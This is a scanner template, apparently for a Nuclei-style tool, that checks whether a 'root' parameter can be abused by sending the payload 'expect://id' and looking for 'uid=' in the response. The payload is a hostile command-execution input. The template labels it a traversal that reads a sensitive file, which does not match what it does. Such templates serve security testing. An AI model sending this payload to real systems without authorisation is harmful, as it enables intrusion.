id: lfi6-0290
name: 'Traversal in root'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via root'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      root:
        - 'expect://id'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
